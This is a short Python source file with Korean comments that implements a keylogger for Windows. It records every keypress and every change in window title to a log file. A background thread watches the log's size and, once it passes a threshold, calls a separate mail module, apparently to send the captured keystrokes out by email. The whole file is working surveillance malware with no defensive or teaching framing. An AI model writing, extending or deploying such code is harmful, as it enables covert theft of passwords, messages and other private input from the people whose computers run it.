import os
import time
import winreg
import mailmanager
import filemanager
import winmanager
from threading import Thread
from pynput.keyboard import Key, Listener

#키입력 감지 함수
def on_press(key):
    filemanager.logger(key)
    print(key)

# 윈도우 타이틀 감지 함수
def wintitle():
    oldtitle = winmanager.gettitle()
    while True:
        time.sleep(0.1)
        if winmanager.gettitle() != oldtitle:
            filemanager.logger("\n" + winmanager.gettitle() + '\n')
        oldtitle = winmanager.gettitle()

#파일 사이즈 감지 함수
def FSC():
    MAX_FILE_SIZE = 20000 #키로깅 파일 최대 크기
    while True:
        time.sleep(1)
        if filemanager.getfilesize() > MAX_FILE_SIZE:
            print("file size over")
            mailmanager.main()

# 메인 함수
def main():
    with Listener(on_press = on_press) as listener:
        listener.join()

#멀티쓰레딩
mainThread = Thread(target=main)
titleThread = Thread(target=wintitle)
FSCThread = Thread(target=FSC)

mainThread.start()
titleThread.start()
FSCThread.start()





